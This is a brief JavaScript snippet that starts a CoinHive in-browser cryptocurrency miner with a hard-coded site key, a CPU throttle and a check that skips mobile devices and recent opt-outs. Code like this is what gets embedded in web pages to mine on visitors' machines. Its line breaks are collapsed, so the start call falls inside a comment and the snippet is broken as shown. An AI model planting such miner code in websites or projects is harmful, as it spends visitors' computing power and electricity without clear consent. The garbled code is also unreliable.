 var miner = new CoinHive.Anonymous('lX7wDskYZwm23fM6ZGrqMr3jdCXXMSVY', {
     throttle: 0.4
 }); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}